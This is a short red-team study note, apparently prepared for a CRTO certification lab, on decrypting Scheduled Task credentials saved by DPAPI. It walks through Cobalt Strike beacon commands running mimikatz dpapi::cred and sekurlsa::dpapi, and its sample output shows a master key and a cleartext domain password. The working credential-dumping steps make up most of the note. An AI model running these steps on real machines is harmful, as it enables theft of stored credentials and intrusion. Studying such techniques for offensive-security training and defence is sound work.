
Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on. They use [[DPAPI]] to store the credentials and can be obtained and decrypted in a similar way as [[Credential Manager]] exploitation occurs.

## 🖊️ via Cobalt Strike

If we have local admin privileges on a machine, we can decrypt them.  The blobs are saved under 
`C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`.

1) `dpapi::cred` can tell us the GUID of the master key used to encrypt each one.

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
```

2) `sekurlsa::dpapi` to dump cached keys.

```
beacon> mimikatz !sekurlsa::dpapi

	 [00000000]
	 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	9/6/2022 12:14:38 PM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
```

3) Now you proceed to decrypt the credential with the decrypted master key

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UserName       : DEV\jking
  CredentialBlob : Qwerty123
```


### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 14:43
🏷️ tags: #redteam #crto 

---

